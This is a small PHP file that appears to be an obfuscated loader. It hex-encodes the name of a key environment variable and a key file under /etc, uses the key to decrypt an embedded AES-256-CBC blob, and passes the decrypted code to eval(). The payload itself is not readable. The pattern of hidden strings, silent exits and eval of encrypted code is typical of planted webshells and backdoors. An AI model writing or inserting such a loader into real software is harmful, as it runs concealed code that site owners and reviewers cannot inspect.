<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('bWne3aTMqvLyMjuwE1Np4A==');

$c=base64_decode(

'kVNw393TAG7wfkkuvAuamQ3qgSvJn5+kTxFdD9lCwqGQqRigM7WvaA/vha7Irvcf3P0JFsoQzcMO' .
'3E3LobVIKiQGzdw1rVOpLwXBAWWF4xiwtSuk1gdeOdnTW7oV3SZcA5mniGexym3EaJe/77VLcg7/' .
'GnRgXs1MQXgj6n+MdUfeenR4CFeGHckCco5J/MZ05R6Ibk0uUXDoydoH12sSu3m/4et05KPvekgt' .
'jpYf/Wgeu1JQl/ux+1thtC0IAU5IQsAbUvJFyfbvphwlR23QTdZV/o4fgb72lSMF0mRFvdxCZ0CL' .
'gk4jYbsTTB6CwVGDEsWXdvKdbvT2GUHjlstth+FnkIC5DgFwkRIjDKh6HIDM0h9uJs8j9TmHyylM' .
'Nmq6E0tbspc1qyNnKzRDGtFQBCmDUF3u2o3Qsv/z/mfK3g9iQRWhjG/VZHgHL95G8S3WYN4LBTlB' .
'qpsKpCRuIK7k9CtfCQsqoAh2iNBjcJCqkzzihzofJriycScmXZb6BGR0qzAZ4frXqz0ohwFtQRdk' .
'xV2GtzEuUepv5PNRszeFQqbZX5LncYmsdz+vl6eeputUPTvFtFzpSWQqssigbGJwM68KVe609vEL' .
'tKRGlACyvFFi60gSXBzQBtgk48RE7AIsy7Cvdx20B9WaQimU6W+vfIG+HU3zI0coiT4BMzpdXc0F' .
'wAfOW6GLcfjQ4b+8iHXobo0ke1tnywPfmGfk7uvs9g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

